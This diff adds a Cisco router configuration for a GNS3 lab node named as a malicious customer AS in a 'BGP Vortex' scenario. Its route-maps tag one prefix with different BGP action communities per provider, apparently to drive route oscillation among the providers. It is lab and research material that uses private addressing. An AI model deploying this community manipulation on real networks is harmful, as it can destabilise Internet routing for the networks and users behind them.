@@ -1,0 +1,57 @@
+! --------------
+! | BGP Vortex |
+! --------------
+! AS 65010 Malicious customer
+!
+! GNS3 node configuration:
+! g0/0: AS 65001 g0/3
+! g0/1: AS 65002 g0/3
+! g0/2: AS 65003 g0/3
+!
+hostname AttackerAS65010
+
+! Interface configuration
+int lo0
+    ip address 172.16.10.1 255.255.255.0
+    description Internal network
+    no sh
+int g0/0
+    ip address 10.1.10.2 255.255.255.252
+    description Provider 65001
+    no sh
+int g0/1
+    ip address 10.2.10.2 255.255.255.252
+    description Provider 65002
+    no sh
+int g0/2
+    ip address 10.3.10.2 255.255.255.252
+    description Provider 65003
+    no sh
+
+! BGP Vortex prefix
+ip prefix-list VORTEX-PREFIX seq 10 permit 172.16.10.0/24
+
+! BGP Vortex communities
+route-map TO-65001 permit 10
+    match ip address prefix-list VORTEX-PREFIX
+    set community 65000:50 65000:65003 additive
+route-map TO-65002 permit 10
+    match ip address prefix-list VORTEX-PREFIX
+    set community 65000:50 65000:65001 additive
+route-map TO-65003 permit 10
+    match ip address prefix-list VORTEX-PREFIX
+    set community 65000:50 65000:65002 additive
+
+router bgp 65010
+    bgp router-id 10.10.0.0
+    network 172.16.10.0 mask 255.255.255.0
+    neighbor 10.1.10.1 remote-as 65001
+    neighbor 10.1.10.1 send-community
+    neighbor 10.1.10.1 route-map TO-65001 out
+    neighbor 10.2.10.1 remote-as 65002
+    neighbor 10.2.10.1 send-community
+    neighbor 10.2.10.1 route-map TO-65002 out
+    neighbor 10.3.10.1 remote-as 65003
+    neighbor 10.3.10.1 send-community
+    neighbor 10.3.10.1 route-map TO-65003 out
+end
